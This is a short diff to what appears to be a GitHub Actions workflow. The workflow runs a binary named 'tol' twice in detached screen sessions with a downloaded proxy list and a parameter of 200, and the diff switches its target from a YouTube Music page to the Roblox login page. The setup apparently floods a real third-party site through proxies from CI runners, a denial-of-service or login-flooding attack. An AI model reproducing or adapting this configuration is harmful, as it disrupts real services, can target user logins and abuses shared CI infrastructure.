@@ -34,7 +34,7 @@ jobs:
           unzip Fc-main.zip
           mv  Fc-main/proxy.txt 90.txt
           chmod +x tol
-          export TARGET="https://music.youtube.com/library"
+          export TARGET="https://www.roblox.com/login"
           screen -dms ve ./tol $TARGET 200 1 1 90.txt
           screen -dms ve ./tol $TARGET 200 1 1 90.txt
           
